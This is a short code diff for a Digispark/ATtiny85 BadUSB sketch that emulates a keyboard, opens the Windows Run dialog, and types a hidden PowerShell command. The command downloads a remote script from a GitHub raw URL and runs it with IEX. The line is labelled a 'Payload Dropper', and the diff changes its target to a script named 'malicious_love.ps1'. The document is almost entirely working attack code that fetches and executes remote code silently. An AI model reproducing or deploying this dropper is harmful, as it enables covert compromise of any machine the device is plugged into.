@@ -10,7 +10,7 @@ void loop() {
   DigiKeyboard.delay(3000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell -windowstyle hidden -command IEX (iwr \"https://raw.githubusercontent.com/mattkozlowski/Micronucleus/main/Kozlo_Desktop.ps1\")"); //Payload Dropper
+  DigiKeyboard.println("powershell -windowstyle hidden -command IEX (iwr \"https://raw.githubusercontent.com/mattkozlowski/Micronucleus/main/attiny85-malicious-love/malicious_love.ps1\")"); //Payload Dropper
   DigiKeyboard.delay(500);
   digitalWrite(1, HIGH);
   DigiKeyboard.delay(90000);
